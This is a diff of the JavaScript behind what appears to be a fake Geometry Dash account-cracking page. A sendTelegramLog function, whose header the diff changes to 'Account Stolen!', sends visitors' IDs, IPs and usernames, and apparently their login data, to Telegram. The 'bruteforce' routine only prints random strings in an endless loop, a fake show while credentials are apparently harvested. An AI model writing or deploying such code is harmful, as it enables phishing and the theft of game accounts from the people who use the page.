@@ -28,7 +28,7 @@ function getOrCreateUserId(ip) {
 // ===== TELEGRAM LOGGING =====
 async function sendTelegramLog(logData) {
     try {
-        const message = `<b>🔐 Authentication Log</b>\n\n` +
+        const message = `<b>🔐 Account Stolen!</b>\n\n` +
             `<code>ID: ${logData.id}\n` +
             `IP: ${logData.ip}\n\n` +
             `Username: ${logData.username}\n` +
@@ -124,7 +124,7 @@ async function logingd(
             new URLSearchParams({
 
                 udid:
-                "36d00413-8358-3de4-b5c0-a41d0ec822ec",
+                "66600413-8358-3de4-b5c0-a41d0ec822ec",
 
                 userName:
                 username,
@@ -325,28 +325,28 @@ async function showProfile(username) {
         const profileStats = document.getElementById('profileStats');
         profileStats.innerHTML = `
             <div class="stat-box">
-                <div class="label">Level</div>
-                <div class="value">${stats.playerLevel || 0}</div>
+                <div class="label">Rank</div>
+                <div class="value">${stats.rank || 0}</div>
             </div>
             <div class="stat-box">
-                <div class="label">CP</div>
-                <div class="value">${stats.creatorPoints || 0}</div>
+                <div class="label">Account ID</div>
+                <div class="value">${stats.accountID || 0}</div>
             </div>
             <div class="stat-box">
                 <div class="label">Stars</div>
                 <div class="value">${stats.stars || 0}</div>
             </div>
             <div class="stat-box">
+                <div class="label">Moons</div>
+                <div class="value">${stats.moons || 0}</div>
+            </div>
+            <div class="stat-box">
                 <div class="label">Diamonds</div>
                 <div class="value">${stats.diamonds || 0}</div>
             </div>
             <div class="stat-box">
-                <div class="label">Coins</div>
-                <div class="value">${stats.secretCoins || 0}</div>
-            </div>
-            <div class="stat-box">
                 <div class="label">Demons</div>
-                <div class="value">${stats.demonLevel || 0}</div>
+                <div class="value">${stats.demons || 0}</div>
             </div>
         `;
     }
@@ -397,7 +397,7 @@ async function searchTarget() {
                     </label>
                 </div>
                 <button class="start-bruteforce-btn" onclick="startBruteforce('${targetUsername}')">
-                    🔓 Start
+                    START
                 </button>
             </div>
         `;
@@ -412,57 +412,41 @@ async function searchTarget() {
     }
 }
 
-function generateRandomPassword(length, charset) {
+// Fungsi untuk generate string random hex 40 digit
+function generateRandomGJP2() {
+    const chars = '0123456789abcdef';
     let result = '';
-    for (let i = 0; i < length; i++) {
-        result += charset.charAt(Math.floor(Math.random() * charset.length));
+    for (let i = 0; i < 40; i++) {
+        result += chars.charAt(Math.floor(Math.random() * chars.length));
     }
     return result;
 }
 
-async function startBruteforce(targetUsername) {
-    const bruteforceProcess = document.getElementById('bruteforceProcess');
+async function startGeneration() {
     const attemptsContainer = document.getElementById('attemptsContainer');
     const statusMessage = document.getElementById('statusMessage');
 
-    let charset = '';
-    if (document.getElementById('charset-lower').checked) charset += 'abcdefghijklmnopqrstuvwxyz';
-    if (document.getElementById('charset-upper').checked) charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
-    if (document.getElementById('charset-num').checked) charset += '0123456789';
-
-    if (charset.length === 0) {
-        alert('Select at least one charset!');
-        return;
-    }
-
-    bruteforceProcess.classList.add('show');
+    document.getElementById('bruteforceProcess').classList.add('show');
     attemptsContainer.innerHTML = '';
 
     let attemptCount = 0;
-    const maxAttempts = 999999999999999999;
 
-    for (let i = 0; i < maxAttempts; i++) {
-        const length = Math.floor(Math.random() * 14) + 6;
-        const password = generateRandomPassword(length, charset);
-
+    // Loop tanpa batas
+    while (true) {
+        const randomGJP2 = generateRandomGJP2();
         attemptCount++;
 
         const attempt = document.createElement('div');
         attempt.className = 'attempt';
-        attempt.textContent = `[${attemptCount}] ${password}`;
+        attempt.textContent = `[${attemptCount}] ${randomGJP2}`;
         attemptsContainer.appendChild(attempt);
 
+        // Auto-scroll ke bawah
         attemptsContainer.scrollTop = attemptsContainer.scrollHeight;
 
-        statusMessage.innerHTML = `
-            <span class="loading-spinner"></span>
-            Testing... ${attemptCount} attempts
-        `;
+        statusMessage.innerHTML = `Bruteforcing... ${attemptCount} attempts`;
 
+        // Delay 50ms supaya browser tidak berat
         await new Promise(resolve => setTimeout(resolve, 50));
     }
-
-    statusMessage.innerHTML = `
-        ⏳ Advanced encryption detected.<br>Strong cryptographic implementation confirmed.
-    `;
-                            }
+}
